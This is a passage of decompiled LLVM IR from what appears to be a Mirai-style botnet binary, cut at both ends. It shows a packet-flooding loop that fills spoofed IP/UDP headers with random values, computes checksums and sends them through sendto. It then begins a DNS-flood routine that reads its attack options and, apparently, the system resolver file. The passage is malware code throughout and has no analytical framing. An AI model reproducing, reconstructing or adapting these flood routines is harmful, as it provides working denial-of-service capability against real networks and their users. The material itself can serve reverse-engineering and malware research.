  %v2_a29c = load i32, i32* @lr, align 4
  %v3_a29c = add i32 %v2_a29c, 8
  %v4_a29c = inttoptr i32 %v3_a29c to i8*
  store i8 %v1_a29c, i8* %v4_a29c, align 1
  %v0_a2a0 = load i32, i32* %r2.global-to-local, align 4
  %v3_a2a0 = udiv i32 %v0_a2a0, 256
  %v1_a2a4 = and i32 %v3_a2a0, 65280
  %v0_a2a8 = load i32, i32* %ip.global-to-local, align 4
  %v2_a2a8 = icmp eq i32 %v0_a2a8, 0
  store i1 %v2_a2a8, i1* %cpsr_z.global-to-local, align 1
  %v4_a2ac = udiv i32 %v0_a2a0, 16777216
  %v5_a2ac = or i32 %v1_a2a4, %v4_a2ac
  store i32 %v5_a2ac, i32* %ip.global-to-local, align 4
  %v2_a2b4 = load i32, i32* @lr, align 4
  %v3_a2b4 = add i32 %v2_a2b4, 9
  %v4_a2b4 = inttoptr i32 %v3_a2b4 to i8*
  store i8 17, i8* %v4_a2b4, align 1
  store i32 ptrtoint (i32* @global_var_25d48.57 to i32), i32* %r3.global-to-local, align 4
  %v0_a2bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a2bc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a218
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_a2c0 = load i32, i32* @lr, align 4
  %v4_a2c0 = add i32 %v3_a2c0, 6
  %v5_a2c0 = inttoptr i32 %v4_a2c0 to i16*
  store i16 64, i16* %v5_a2c0, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a218, %bb
  %v2_a2c4 = load i32, i32* @global_var_25d48.57, align 4
  %v1_a2c8 = load i32, i32* @lr, align 4
  %v2_a2c8 = add i32 %v1_a2c8, 12
  %v3_a2c8 = inttoptr i32 %v2_a2c8 to i32*
  store i32 %v2_a2c4, i32* %v3_a2c8, align 4
  store i32 %v2_a234, i32* %r2.global-to-local, align 4
  %v1_a2d0 = add i32 %v2_a234, 16
  %v2_a2d0 = inttoptr i32 %v1_a2d0 to i32*
  %v3_a2d0 = load i32, i32* %v2_a2d0, align 4
  %v1_a2d4 = load i32, i32* @lr, align 4
  %v2_a2d4 = add i32 %v1_a2d4, 16
  %v3_a2d4 = inttoptr i32 %v2_a2d4 to i32*
  store i32 %v3_a2d0, i32* %v3_a2d4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_a2dc = load i32, i32* @lr, align 4
  %v1_a2dc = add i32 %v0_a2dc, 20
  store i32 %v1_a2dc, i32* %r4.global-to-local, align 4
  %v2_a2e0 = add i32 %v0_a2dc, 28
  %v3_a2e0 = inttoptr i32 %v2_a2e0 to i32*
  store i32 -1, i32* %v3_a2e0, align 4
  %v0_a2e4 = load i32, i32* @r5, align 4
  %v1_a2e4 = trunc i32 %v0_a2e4 to i16
  %v2_a2e4 = load i32, i32* @lr, align 4
  %v3_a2e4 = add i32 %v2_a2e4, 4
  %v4_a2e4 = inttoptr i32 %v3_a2e4 to i16*
  store i16 %v1_a2e4, i16* %v4_a2e4, align 2
  %v0_a2e8 = load i32, i32* @lr, align 4
  %v1_a2e8 = add i32 %v0_a2e8, 32
  %v0_a2ec = load i32, i32* %ip.global-to-local, align 4
  %v1_a2ec = trunc i32 %v0_a2ec to i16
  %v2_a2ec = load i32, i32* %r4.global-to-local, align 4
  %v3_a2ec = add i32 %v2_a2ec, 4
  %v4_a2ec = inttoptr i32 %v3_a2ec to i16*
  store i16 %v1_a2ec, i16* %v4_a2ec, align 2
  %v0_a2f0 = load i32, i32* @r7, align 4
  %v1_a2f0 = trunc i32 %v0_a2f0 to i16
  %v2_a2f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_a2f0 = add i32 %v2_a2f0, 2
  %v4_a2f0 = inttoptr i32 %v3_a2f0 to i16*
  store i16 %v1_a2f0, i16* %v4_a2f0, align 2
  %v0_a2f4 = load i32, i32* @r6, align 4
  %v1_a2f4 = trunc i32 %v0_a2f4 to i16
  %v2_a2f4 = load i32, i32* @lr, align 4
  %v3_a2f4 = add i32 %v2_a2f4, 20
  %v4_a2f4 = inttoptr i32 %v3_a2f4 to i16*
  store i16 %v1_a2f4, i16* %v4_a2f4, align 2
  %v3_a2f8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a2f8, i32* %r2.global-to-local, align 4
  %v3_a2fc = call i32 @util_memcpy(i32 %v1_a2e8, i32 %v3_a170, i32 %v3_a2f8)
  %v3_a300 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a300, i32* %r3.global-to-local, align 4
  %v1_a304 = add i32 %v3_a300, 1
  store i32 %v1_a304, i32* @r4, align 4
  %v1_a308 = load i32, i32* @r8, align 4
  %v9_a308 = icmp eq i32 %v1_a304, %v1_a308
  store i1 %v9_a308, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a304, i32* %stack_var_-44, align 4
  %v5_a310 = icmp slt i32 %v1_a304, %v1_a308
  br i1 %v5_a310, label %dec_label_pc_a218, label %dec_label_pc_a314.preheader

dec_label_pc_a314.preheader:                      ; preds = %.thread, %dec_label_pc_a1bc
  %v0_a318.ph = phi i32 [ 0, %dec_label_pc_a1bc ], [ %v1_a308, %.thread ]
  %v3_a354 = icmp eq i32 %v3_a1cc, 65535
  br label %dec_label_pc_a314

dec_label_pc_a314:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a400, %dec_label_pc_a314.preheader
  %v0_a318 = phi i32 [ %v0_a318.ph, %dec_label_pc_a314.preheader ], [ 0, %dec_label_pc_a400 ], [ 0, %dec_label_pc_a314 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a318 = icmp eq i32 %v0_a318, 0
  store i1 %v2_a318, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a318, label %dec_label_pc_a314, label %dec_label_pc_a324

dec_label_pc_a324:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a400
  br label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a374, %dec_label_pc_a324
  %v1_a338 = phi i32 [ %v1_a3f0, %dec_label_pc_a374 ], [ 0, %dec_label_pc_a324 ]
  %v5_a32c = mul i32 %v1_a338, 24
  %v1_a330 = load i32, i32* @sl, align 4
  %v2_a330 = add i32 %v1_a330, %v5_a32c
  store i32 %v2_a330, i32* %r3.global-to-local, align 4
  %v1_a334 = add i32 %v2_a330, 20
  %v2_a334 = inttoptr i32 %v1_a334 to i8*
  %v3_a334 = load i8, i8* %v2_a334, align 1
  %v4_a334 = zext i8 %v3_a334 to i32
  store i32 %v4_a334, i32* %r2.global-to-local, align 4
  %v0_a338 = load i32, i32* @fp, align 4
  %v4_a338 = mul i32 %v1_a338, 4
  %v5_a338 = add i32 %v0_a338, %v4_a338
  %v6_a338 = inttoptr i32 %v5_a338 to i32*
  %v7_a338 = load i32, i32* %v6_a338, align 4
  store i32 %v7_a338, i32* @r5, align 4
  %v7_a340 = icmp eq i8 %v3_a334, 31
  store i1 %v7_a340, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_a348 = add i32 %v7_a338, 20
  store i32 %v1_a348, i32* @r6, align 4
  %tmp40 = icmp ult i8 %v3_a334, 32
  br i1 %tmp40, label %dec_label_pc_a414, label %dec_label_pc_a350

dec_label_pc_a350:                                ; preds = %dec_label_pc_a328
  store i32 %v3_a1cc, i32* %r3.global-to-local, align 4
  store i1 %v3_a354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a354, label %dec_label_pc_a474, label %dec_label_pc_a35c

dec_label_pc_a35c:                                ; preds = %dec_label_pc_a414, %dec_label_pc_a350
  %v1_a360 = phi i32 [ %v1_a46c, %dec_label_pc_a414 ], [ 65535, %dec_label_pc_a350 ]
  store i32 %v3_a1d0, i32* %ip.global-to-local, align 4
  %v9_a360 = icmp eq i32 %v3_a1d0, %v1_a360
  store i1 %v9_a360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a360, label %dec_label_pc_a488, label %dec_label_pc_a368

dec_label_pc_a368:                                ; preds = %dec_label_pc_a474.dec_label_pc_a368_crit_edge, %dec_label_pc_a35c
  %v1_a36c = phi i32 [ %v1_a36c.pre, %dec_label_pc_a474.dec_label_pc_a368_crit_edge ], [ %v1_a360, %dec_label_pc_a35c ]
  %v9_a36c = icmp eq i32 %v3_a1d4, %v1_a36c
  store i1 %v9_a36c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a36c, label %dec_label_pc_a49c, label %dec_label_pc_a374

dec_label_pc_a374:                                ; preds = %dec_label_pc_a488, %dec_label_pc_a368, %dec_label_pc_a49c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_a378 = load i32, i32* @r5, align 4
  %v3_a378 = add i32 %v2_a378, 10
  %v4_a378 = inttoptr i32 %v3_a378 to i16*
  store i16 0, i16* %v4_a378, align 2
  %v0_a380 = load i32, i32* @r5, align 4
  store i32 %v0_a380, i32* @r0, align 4
  %v2_a384 = call i32 @checksum_generic(i32 %v0_a380, i32 20)
  %v3_a384 = trunc i32 %v2_a384 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a38c = load i32, i32* @r5, align 4
  %v4_a38c = add i32 %v3_a38c, 10
  %v5_a38c = inttoptr i32 %v4_a38c to i16*
  store i16 %v3_a384, i16* %v5_a38c, align 2
  %v0_a390 = load i32, i32* %r3.global-to-local, align 4
  %v1_a390 = trunc i32 %v0_a390 to i16
  %v2_a390 = load i32, i32* @r6, align 4
  %v3_a390 = add i32 %v2_a390, 6
  %v4_a390 = inttoptr i32 %v3_a390 to i16*
  store i16 %v1_a390, i16* %v4_a390, align 2
  %v3_a394 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a394, i32* %r3.global-to-local, align 4
  %v0_a398 = load i32, i32* @r6, align 4
  store i32 %v0_a398, i32* @r1, align 4
  %v1_a39c = add i32 %v0_a398, 4
  %v2_a39c = inttoptr i32 %v1_a39c to i16*
  %v3_a39c = load i16, i16* %v2_a39c, align 2
  %v4_a39c = zext i16 %v3_a39c to i32
  store i32 %v4_a39c, i32* %r2.global-to-local, align 4
  %v1_a3a0 = add i32 %v3_a394, 12
  store i32 %v1_a3a0, i32* %r3.global-to-local, align 4
  %v0_a3a4 = load i32, i32* @r5, align 4
  %v4_a3a8 = call i32 @checksum_tcpudp(i32 %v0_a3a4, i32 %v0_a398, i32 %v4_a39c, i32 %v1_a3a0)
  %v5_a3a8 = trunc i32 %v4_a3a8 to i16
  %v3_a3ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a3ac, i32* %r3.global-to-local, align 4
  %v3_a3b0 = mul i32 %v3_a3ac, 32
  store i32 %v3_a3b0, i32* %lr.global-to-local, align 4
  %v3_a3b4 = load i32, i32* @r6, align 4
  %v4_a3b4 = add i32 %v3_a3b4, 6
  %v5_a3b4 = inttoptr i32 %v4_a3b4 to i16*
  store i16 %v5_a3a8, i16* %v5_a3b4, align 2
  %v0_a3b8 = load i32, i32* %lr.global-to-local, align 4
  %v1_a3b8 = load i32, i32* %r3.global-to-local, align 4
  %tmp41 = mul i32 %v1_a3b8, -8
  %v5_a3b8 = add i32 %v0_a3b8, %tmp41
  store i32 %v5_a3b8, i32* %lr.global-to-local, align 4
  %v0_a3bc = load i32, i32* @r6, align 4
  %v1_a3bc = add i32 %v0_a3bc, 2
  %v2_a3bc = inttoptr i32 %v1_a3bc to i16*
  %v3_a3bc = load i16, i16* %v2_a3bc, align 2
  %v4_a3bc = zext i16 %v3_a3bc to i32
  store i32 %v4_a3bc, i32* @r6, align 4
  %v3_a3c0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a3c0, i32* %r2.global-to-local, align 4
  %v1_a3c4 = load i32, i32* @sl, align 4
  %v2_a3c4 = add i32 %v1_a3c4, %v5_a3b8
  store i32 %v2_a3c4, i32* @lr, align 4
  %v3_a3c8 = add i32 %v2_a3c4, 2
  %v4_a3c8 = inttoptr i32 %v3_a3c8 to i16*
  store i16 %v3_a3bc, i16* %v4_a3c8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a3d4 = load i32, i32* @r5, align 4
  %v0_a3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a3d8 = add i32 %v0_a3d8, 32
  store i32 %v1_a3d8, i32* %r2.global-to-local, align 4
  %v0_a3dc = load i32, i32* @sb, align 4
  %v0_a3e0 = load i32, i32* @lr, align 4
  %v6_a3e8 = call i32 @__libc_sendto(i32 %v0_a3dc, i32 %v0_a3d4, i32 %v1_a3d8, i32 16384, i32 %v0_a3e0, i32 16)
  %v3_a3ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a3ec, i32* %r3.global-to-local, align 4
  %v1_a3f0 = add i32 %v3_a3ec, 1
  %v1_a3f4 = load i32, i32* @r8, align 4
  %v9_a3f4 = icmp eq i32 %v1_a3f0, %v1_a3f4
  store i1 %v9_a3f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a3f0, i32* %stack_var_-44, align 4
  %v5_a3fc = icmp slt i32 %v1_a3f0, %v1_a3f4
  br i1 %v5_a3fc, label %dec_label_pc_a328, label %dec_label_pc_a400

dec_label_pc_a400:                                ; preds = %dec_label_pc_a374
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a404 = icmp eq i32 %v1_a3f4, 0
  store i1 %v2_a404, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a404, label %dec_label_pc_a314, label %dec_label_pc_a324

dec_label_pc_a414:                                ; preds = %dec_label_pc_a328
  %v1_a414 = add i32 %v2_a330, 16
  %v2_a414 = inttoptr i32 %v1_a414 to i32*
  %v3_a414 = load i32, i32* %v2_a414, align 4
  store i32 %v3_a414, i32* @r4, align 4
  %v0_a418 = call i32 @rand_next()
  %v3_a41c = load i32, i32* %stack_var_-44, align 4
  %v5_a424 = mul i32 %v3_a41c, 24
  %v0_a428 = load i32, i32* @r4, align 4
  %v1_a428 = and i32 %v0_a428, 16711680
  store i32 %v1_a428, i32* %ip.global-to-local, align 4
  %v3_a42c = udiv i32 %v0_a428, 16777216
  %v4_a430 = udiv i32 %v1_a428, 256
  %v5_a430 = or i32 %v4_a430, %v3_a42c
  store i32 %v5_a430, i32* %r2.global-to-local, align 4
  %v1_a434 = load i32, i32* @sl, align 4
  %v2_a434 = add i32 %v1_a434, %v5_a424
  %v1_a438 = and i32 %v0_a428, 65280
  store i32 %v1_a438, i32* %r3.global-to-local, align 4
  %v1_a43c = add i32 %v2_a434, 20
  %v2_a43c = inttoptr i32 %v1_a43c to i8*
  %v3_a43c = load i8, i8* %v2_a43c, align 1
  %v4_a43c = zext i8 %v3_a43c to i32
  store i32 %v4_a43c, i32* %ip.global-to-local, align 4
  %v5_a444 = call i32 @llvm.bswap.i32(i32 %v0_a428)
  %v7_a448 = lshr i32 %v0_a418, %v4_a43c
  %v8_a448 = add i32 %v7_a448, %v5_a444
  store i32 %v8_a448, i32* %r2.global-to-local, align 4
  %v5_a460 = call i32 @llvm.bswap.i32(i32 %v8_a448)
  %v1_a464 = load i32, i32* @r5, align 4
  %v2_a464 = add i32 %v1_a464, 16
  %v3_a464 = inttoptr i32 %v2_a464 to i32*
  store i32 %v5_a460, i32* %v3_a464, align 4
  store i32 %v3_a1cc, i32* %r3.global-to-local, align 4
  %v1_a46c = load i32, i32* @r7, align 4
  %v9_a46c = icmp eq i32 %v3_a1cc, %v1_a46c
  store i1 %v9_a46c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a46c, label %dec_label_pc_a474, label %dec_label_pc_a35c

dec_label_pc_a474:                                ; preds = %dec_label_pc_a414, %dec_label_pc_a350
  %v0_a474 = call i32 @rand_next()
  %v1_a474 = trunc i32 %v0_a474 to i16
  store i32 %v3_a1d0, i32* %ip.global-to-local, align 4
  %v1_a47c = load i32, i32* @r7, align 4
  %v9_a47c = icmp eq i32 %v3_a1d0, %v1_a47c
  store i1 %v9_a47c, i1* %cpsr_z.global-to-local, align 1
  %v3_a480 = load i32, i32* @r5, align 4
  %v4_a480 = add i32 %v3_a480, 4
  %v5_a480 = inttoptr i32 %v4_a480 to i16*
  store i16 %v1_a474, i16* %v5_a480, align 2
  br i1 %v9_a47c, label %dec_label_pc_a488, label %dec_label_pc_a474.dec_label_pc_a368_crit_edge

dec_label_pc_a474.dec_label_pc_a368_crit_edge:    ; preds = %dec_label_pc_a474
  %v1_a36c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a368

dec_label_pc_a488:                                ; preds = %dec_label_pc_a474, %dec_label_pc_a35c
  %v0_a488 = call i32 @rand_next()
  %v1_a488 = trunc i32 %v0_a488 to i16
  %v1_a490 = load i32, i32* @r7, align 4
  %v9_a490 = icmp eq i32 %v3_a1d4, %v1_a490
  store i1 %v9_a490, i1* %cpsr_z.global-to-local, align 1
  %v3_a494 = load i32, i32* @r5, align 4
  %v4_a494 = add i32 %v3_a494, 20
  %v5_a494 = inttoptr i32 %v4_a494 to i16*
  store i16 %v1_a488, i16* %v5_a494, align 2
  br i1 %v9_a490, label %dec_label_pc_a49c, label %dec_label_pc_a374

dec_label_pc_a49c:                                ; preds = %dec_label_pc_a488, %dec_label_pc_a368
  %v0_a49c = call i32 @rand_next()
  %v1_a49c = trunc i32 %v0_a49c to i16
  %v3_a4a0 = load i32, i32* @r6, align 4
  %v4_a4a0 = add i32 %v3_a4a0, 2
  %v5_a4a0 = inttoptr i32 %v4_a4a0 to i16*
  store i16 %v1_a49c, i16* %v5_a4a0, align 2
  br label %dec_label_pc_a374

dec_label_pc_a4a8:                                ; preds = %dec_label_pc_a194
  %v0_a4a8 = load i32, i32* @sb, align 4
  %v1_a4ac = call i32 @__GI___libc_close(i32 %v0_a4a8)
  br label %dec_label_pc_a4b0

dec_label_pc_a4b0:                                ; preds = %entry, %dec_label_pc_a4a8
  %v1_a4b8 = phi i32 [ %v3_a184, %entry ], [ %v1_a4ac, %dec_label_pc_a4a8 ]
  store i32 %v3_a088, i32* %r4.global-to-local, align 4
  store i32 %v27_a088, i32* %lr.global-to-local, align 4
  ret i32 %v1_a4b8

; uselistorder directives
  uselistorder i32 %v1_a46c, { 1, 0 }
  uselistorder i32 %v0_a428, { 1, 2, 0, 3 }
  uselistorder i32 %v1_a3f0, { 2, 0, 3, 1 }
  uselistorder i32 %v5_a3b8, { 1, 0 }
  uselistorder i1 %v3_a354, { 1, 0 }
  uselistorder i32 %v1_a304, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a26c, { 1, 0 }
  uselistorder i32 %v3_a204, { 1, 0 }
  uselistorder i32 %v3_a200, { 1, 0 }
  uselistorder i32 %v0_a1c4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a1c0, { 1, 0, 2 }
  uselistorder i32 %v0_a1bc, { 1, 0, 3, 2 }
  uselistorder i1 %v7_a1b4, { 1, 0 }
  uselistorder i1 %v7_a188, { 1, 0 }
  uselistorder i32 %v3_a184, { 1, 2, 3, 0 }
  uselistorder i32 %v1_a124, { 1, 0 }
  uselistorder i32 %v5_a0f8, { 1, 0 }
  uselistorder i32 %v5_a0bc, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a4b0, { 1, 0 }
  uselistorder label %dec_label_pc_a374, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a324, { 1, 0 }
  uselistorder label %dec_label_pc_a314, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_method_udpdns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v27_a4c0 = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a4e0 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a4e4 = load i32, i32* @r5, align 4
  store i32 %v0_a4e4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_a4f0 = load i32, i32* @r4, align 4
  store i32 %v0_a4f0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_a4f8 = inttoptr i32 %v0_a4e4 to i32*
  %v6_a4f8 = call i32 @attack_get_opt_int(i32 %v0_a4f0, i32* %v5_a4f8, i32 2, i32 0)
  %v1_a504 = urem i32 %v6_a4f8, 256
  store i32 %v1_a504, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a510 = load i32, i32* @r4, align 4
  store i32 %v0_a510, i32* %r0.global-to-local, align 4
  %v0_a514 = load i32, i32* @r5, align 4
  store i32 %v0_a514, i32* %r1.global-to-local, align 4
  %v6_a51c = inttoptr i32 %v0_a514 to i32*
  %v7_a51c = call i32 @attack_get_opt_int(i32 %v0_a510, i32* %v6_a51c, i32 3, i32 65535)
  %v0_a520 = load i32, i32* @r5, align 4
  store i32 %v0_a520, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_a52c = load i32, i32* @r4, align 4
  store i32 %v0_a52c, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_a534 = inttoptr i32 %v0_a520 to i32*
  %v6_a534 = call i32 @attack_get_opt_int(i32 %v0_a52c, i32* %v5_a534, i32 4, i32 64)
  %v1_a53c = urem i32 %v6_a534, 256
  store i32 %v1_a53c, i32* %ip.global-to-local, align 4
  %v0_a540 = load i32, i32* @r5, align 4
  store i32 %v0_a540, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a54c = load i32, i32* @r4, align 4
  store i32 %v0_a54c, i32* %r0.global-to-local, align 4
  %v6_a554 = inttoptr i32 %v0_a540 to i32*
  %v7_a554 = call i32 @attack_get_opt_int(i32 %v0_a54c, i32* %v6_a554, i32 5, i32 0)
  %v1_a560 = urem i32 %v7_a554, 256
  store i32 %v1_a560, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a56c = load i32, i32* @r4, align 4
  store i32 %v0_a56c, i32* %r0.global-to-local, align 4
  %v0_a570 = load i32, i32* @r5, align 4
  store i32 %v0_a570, i32* %r1.global-to-local, align 4
  %v5_a578 = inttoptr i32 %v0_a570 to i32*
  %v6_a578 = call i32 @attack_get_opt_int(i32 %v0_a56c, i32* %v5_a578, i32 6, i32 65535)
  %v0_a57c = load i32, i32* @r5, align 4
  store i32 %v0_a57c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a588 = load i32, i32* @r4, align 4
  store i32 %v0_a588, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_a590 = inttoptr i32 %v0_a57c to i32*
  %v6_a590 = call i32 @attack_get_opt_int(i32 %v0_a588, i32* %v5_a590, i32 7, i32 53)
  %v0_a59c = load i32, i32* @r5, align 4
  store i32 %v0_a59c, i32* %r1.global-to-local, align 4
  %v0_a5a0 = load i32, i32* @r4, align 4
  store i32 %v0_a5a0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_a5ac = inttoptr i32 %v0_a59c to i32*
  %v6_a5ac = call i32 @attack_get_opt_int(i32 %v0_a5a0, i32* %v5_a5ac, i32 9, i32 65535)
  %v0_a5b0 = load i32, i32* @r5, align 4
  store i32 %v0_a5b0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_a5bc = load i32, i32* @r4, align 4
  store i32 %v0_a5bc, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_a5c4 = inttoptr i32 %v0_a5b0 to i32*
  %v6_a5c4 = call i32 @attack_get_opt_int(i32 %v0_a5bc, i32* %v5_a5c4, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a5d0 = load i32, i32* @r5, align 4
  store i32 %v0_a5d0, i32* %r1.global-to-local, align 4
  store i32 %v6_a5c4, i32* @sb, align 4
  %v0_a5d8 = load i32, i32* @r4, align 4
  store i32 %v0_a5d8, i32* %r0.global-to-local, align 4
  %v4_a5dc = inttoptr i32 %v0_a5d0 to i32*
  %v5_a5dc = call i32 @attack_get_opt_str(i32 %v0_a5d8, i32* %v4_a5dc, i32 8, i32 0)
  store i32 %v5_a5dc, i32* @r7, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a5e8 = call i32 @table_unlock_val(i32 21)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_a5f4 = call i32 @table_retrieve_val(i32 21, i32* null)
  store i32 %v3_a5f4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_a5fc = call i32 @__libc_open(i32 %v3_a5f4, i32 0)
  store i32 %v2_a5fc, i32* @r4, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a608 = call i32 @table_lock_val(i32 21)
  store i32 %v1_a608, i32* %r0.global-to-local, align 4
  %v0_a60c = load i32, i32* @r4, align 4
  %v1_a60c = icmp slt i32 %v0_a60c, 0
  %v2_a60c = icmp eq i32 %v0_a60c, 0
  store i1 %v2_a60c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_a60c, label %dec_label_pc_ab04, label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %entry
  %v2_a618 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_a618, i32* @sl, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_a618, i32* @r1, align 4
  store i32 %v0_a60c, i32* %r0.global-to-local, align 4
  %v1_a628 = call i32 @__libc_read(i32 %v0_a60c)
  store i32 %v1_a628, i32* @r5, align 4
  %v0_a630 = load i32, i32* @r4, align 4
  store i32 %v0_a630, i32* %r0.global-to-local, align 4
  %v1_a634 = call i32 @__GI___libc_close(i32 %v0_a630)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a63c = call i32 @table_unlock_val(i32 22)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_a648 = call i32 @table_retrieve_val(i32 22, i32* null)
  %v0_a64c = load i32, i32* @r5, align 4
  store i32 %v0_a64c, i32* @r1, align 4
  store i32 %v3_a648, i32* %r2.global-to-local, align 4
  store i32 %v2_a618, i32* %r0.global-to-local, align 4
  %v3_a658 = bitcast i32* %stack_var_-2124 to i8*
  %v4_a658 = call i32 @util_stristr(i8* %v3_a658, i32 %v0_a64c, i32 %v3_a648)
  store i32 %v4_a658, i32* @r6, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a664 = call i32 @table_lock_val(i32 22)
  store i32 %v1_a664, i32* %r0.global-to-local, align 4
  %v0_a668 = load i32, i32* @r6, align 4
  %v7_a668 = icmp eq i32 %v0_a668, -1
  store i1 %v7_a668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a668, label %dec_label_pc_ab04, label %dec_label_pc_a670

dec_label_pc_a670:                                ; preds = %dec_label_pc_a614
  %v0_a670 = load i32, i32* @r5, align 4
  %v9_a670 = icmp eq i32 %v0_a670, %v0_a668
  store i1 %v9_a670, i1* %cpsr_z.global-to-local, align 1
  %v7_a674 = icmp sgt i32 %v0_a670, %v0_a668
  br i1 %v7_a674, label %dec_label_pc_a678, label %dec_label_pc_ab04

dec_label_pc_a678:                                ; preds = %dec_label_pc_a670
  %v0_a678 = load i32, i32* @sl, align 4
  %v2_a678 = add i32 %v0_a678, %v0_a668
  store i32 %v2_a678, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_a6a4 = add i32 %v0_a670, -1
  br label %dec_label_pc_a69c

dec_label_pc_a688:                                ; preds = %dec_label_pc_a6c4, %bb103
  %v9_a688 = icmp eq i32 %v1_a6a4, %v0_a690
  store i1 %v9_a688, i1* %cpsr_z.global-to-local, align 1
